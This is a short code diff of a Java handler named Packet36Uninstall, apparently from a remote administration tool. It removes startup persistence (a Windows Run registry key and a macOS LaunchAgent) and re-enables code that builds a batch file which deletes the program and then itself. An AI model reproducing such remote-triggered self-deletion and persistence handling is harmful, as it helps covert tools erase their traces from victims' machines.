@@ -11,7 +11,6 @@ import java.io.File;
 import java.io.FileWriter;
 import java.util.Random;
 
-
 public class Packet36Uninstall extends AbstractIncomingPacket {
 
 	@Override
@@ -31,13 +30,14 @@ public class Packet36Uninstall extends AbstractIncomingPacket {
 
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.name);
-				/*
-				 * file = new File(fileName + ".bat");
-				 * 
-				 * text += "pause\n"; text += "del \"" + me.getAbsolutePath() +
-				 * "\"" + "\n"; text += "del %0"; text = text.replace("\n",
-				 * " & ");
-				 */
+
+				file = new File(fileName + ".bat");
+
+				text += "pause\n";
+				text += "del \"" + me.getAbsolutePath() + "\"" + "\n";
+				text += "del %0";
+				text = text.replace("\n", " & ");
+
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Configuration.name + ".plist");
 				startupFile.delete();
